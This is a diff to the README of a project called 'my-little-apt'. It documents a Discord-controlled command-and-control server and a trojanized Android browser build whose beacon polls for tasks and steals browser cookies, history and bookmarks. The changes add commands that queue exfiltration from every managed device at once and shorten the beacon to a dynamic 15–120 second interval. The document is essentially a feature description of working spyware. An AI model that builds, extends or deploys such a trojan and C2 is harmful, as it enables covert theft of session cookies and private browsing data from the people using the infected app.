@@ -30,9 +30,10 @@ my-little-apt/
 
 1. **Admin queues a task** via Discord (`/queue-task device=POCO_F5 type=request-cookies`)
 2. **Server stores** the task in a per-device queue
-3. **Beacon polls** every 15 minutes via `/beacon/tasks/{device_name}`
+3. **Beacon polls** at a configurable interval (15–120 seconds) via `/beacon/tasks/{device_name}`
 4. **Server dequeues** and returns the task (fire-once)
 5. **Client executes** the command (e.g., reads cookies from WebView) and sends the result back via `/beacon/result`
+6. **Beacon reads** the `beacon_interval` from the server response and dynamically schedules its next check-in
 
 ---
 
@@ -131,8 +132,10 @@ The Discord bot serves as the **admin panel** for the C2 server. It accepts comm
 | Command | Arguments | Description |
 |---|---|---|
 | `/show-devices` | — | Lists all managed devices with their status |
-| `/set-beacon-interval` | `2` \| `4` \| `8` \| `16` \| `32` (autocomplete) | Sets the beacon interval (seconds) |
-| `/request-cookies` | — | Displays stored cookies from managed devices |
+| `/set-beacon-interval` | `15` \| `30` \| `60` \| `120` (autocomplete) | Sets the beacon interval (seconds) |
+| `/request-cookies` | — | Shows cached cookies **and** auto-queues a fresh exfiltration for all devices |
+| `/request-history` | `device` (optional, default `*`) | Queues a history exfiltration task |
+| `/request-bookmarks` | `device` (optional, default `*`) | Queues a bookmarks exfiltration task |
 | `/set-communication-protocol` | `http` \| `https` \| `dns` (autocomplete) | Sets the communication protocol |
 | `/queue-task` | `device`, `task_type`, `parameters` (autocomplete) | Queue a task for a device (or `*` for all) |
 | `/pending-tasks` | — | Show pending task counts per device |
@@ -184,25 +187,27 @@ trojan-ddg/trojan/
     ├── C2NetworkModule.kt   → @Named("c2") OkHttp/Retrofit (isolated from DDG)
     ├── RealBeaconService.kt → Check-in + task polling logic
     ├── CommandHandler.kt    → Dispatches: request-cookies/history/bookmarks
-    └── BeaconWorker.kt      → WorkManager periodic job (every 15 min)
+    └── BeaconWorker.kt      → Self-rescheduling OneTimeWorkRequest (dynamic interval)
 ```
 
 ### Supported Commands
 
-| Task Type | Data Source | What it steals |
-|---|---|---|
-| `request-cookies` | `CookieManagerProvider` → WebView `CookieManager` | Browser cookies for specified domains |
-| `request-history` | `NavigationHistory` | Browsing URLs, titles, visit counts |
-| `request-bookmarks` | `SavedSitesRepository` | All bookmarks and favorites |
+| Task Type | Parameters | Data Source | What it exfiltrates |
+|---|---|---|---|
+| `request-cookies` | `{"domains": "google.com,github.com"}` | `CookieManagerProvider` → WebView `CookieManager` | Browser cookies for specified (or default) domains |
+| `request-history` | — | `NavigationHistory` | Browsing URLs, titles, visit counts |
+| `request-bookmarks` | — | `SavedSitesRepository` | All bookmarks and favorites |
 
 ### How the Beacon Works
 
-1. `BeaconInitializer` registers a `PeriodicWorkRequest` when the app starts
-2. `BeaconWorker` fires every 15 minutes (requires network connectivity)
-3. It calls `POST /beacon/check-in` to register the device
-4. Then `GET /beacon/tasks/{device_name}` to poll for commands
-5. For each command, `CommandHandler.execute()` gathers the data
-6. Results are sent back via `POST /beacon/result`
+1. `BeaconInitializer` schedules a `OneTimeWorkRequest` with a 15-second initial delay when the app starts
+2. `BeaconWorker` fires and calls `POST /beacon/check-in` to register the device
+3. Then `GET /beacon/tasks/{device_name}` to poll for commands
+4. For each command, `CommandHandler.execute()` gathers the data
+5. Results are sent back via `POST /beacon/result`
+6. The worker reads `beacon_interval` from the server response and schedules the **next** `OneTimeWorkRequest` with that interval (self-rescheduling chain)
+
+> **Dynamic intervals:** The admin can change the beacon interval at any time via `/set-beacon-interval`. The client picks up the new value on its next check-in. Valid values: `15`, `30`, `60`, `120` seconds.
 
 ---
 
@@ -216,7 +221,7 @@ pip install -r requirements.txt -r requirements-dev.txt
 python -m pytest tests/ -v
 ```
 
-### Discord Bot Tests
+### Discord Bot Tests (109 tests)
 
 ```bash
 cd discord-bot
